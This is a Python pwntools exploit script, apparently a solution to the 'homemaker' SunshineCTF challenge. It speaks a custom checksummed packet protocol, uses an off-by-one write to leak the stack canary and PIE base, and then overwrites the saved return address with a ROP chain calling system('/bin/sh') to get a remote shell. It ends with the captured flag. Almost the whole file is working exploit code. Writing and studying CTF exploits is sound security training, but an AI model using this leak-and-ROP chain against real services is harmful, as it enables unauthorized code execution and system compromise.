#!/usr/bin/env python3
from pwn import *

HOST = "sunshinectf.games"
PORT = 26008
elf = context.binary = ELF('./homemaker', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001707
            brva 0x00000000000014AA
            brva 0x000000000000180E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def checksum(data:bytes) -> int:
    v4 = 0
    for c in data:
        v4 ^= c
        for _ in range(8):
            if v4 & 0x80:
                v4 = ((v4 << 1) ^ 0x2f) & 0xff
            else:
                v4 = (v4 << 1) & 0xff

    return v4

def createP(cmd: int, pl:bytes = b"") -> bytes:
    body = bytes([cmd]) + pl
    return (
        b'\x1b\x5b' +
        p16(len(body), endian="big") +
        body +
        bytes([checksum(body)]) +
        b'\x1b\x5c'
    )

def sendP(p, cmd: int, pl:bytes = b""):
    p.send(createP(cmd, pl))

def recvP(p) -> bytes:
    p.recvuntil(b'\x1b\x5b')
    sz = u16(p.recvn(2), endian="big")
    body = p.recvn(sz)
    chk = p.recvn(1)
    end = p.recvn(2)
    assert end == b"\x1b\x5c"
    assert checksum(body) == chk[0]
    return body

# Login

sendP(p, 1, p32(0x1337c35f, endian="big"))
recvP(p)
# Write -> off-by-one -> leak stack + canary

GDB()
pl = b'A'*(0x100-1) + b'\x49'

sendP(p, 2, pl)
recvP(p)
# GDB()
sendP(p, 3)
body = recvP(p)
leak = body[1:]

# for i in range(0, len(leak) - 7, 8):
#     print(f'offset {i:#04x}: {u64(leak[i:i+8]):#018x}')

canary = u64(leak[0x108:0x110])
rbp = u64(leak[0x110:0x118]) - 0x20
ret_val = u64(leak[0x118:0x120])
PIE = ret_val - 0x1a9f

log.success(f'canary: {hex(canary)}')
log.success(f'rbp: {hex(rbp)}')
log.success(f'rip: {hex(rbp+8)}')
log.success(f'PIE_base: {hex(PIE)}')

# Overvrite saved rip

# GDB()

pl = flat(
    b'B'*0x40,
    b'/bin/sh\0',
    b'C'*0xc0,
    canary,
    b'D'*8,
    PIE + 0x12aa, # pop rdi
    PIE + 0x48a5, # bin/sh
    PIE + 0x12F7 # system
    )

sendP(p, 2, pl)
recvP(p)

sendP(p, 4)

p.interactive()

# sun{the_future_is_now_today_well_wait_how_are_you_reading_this}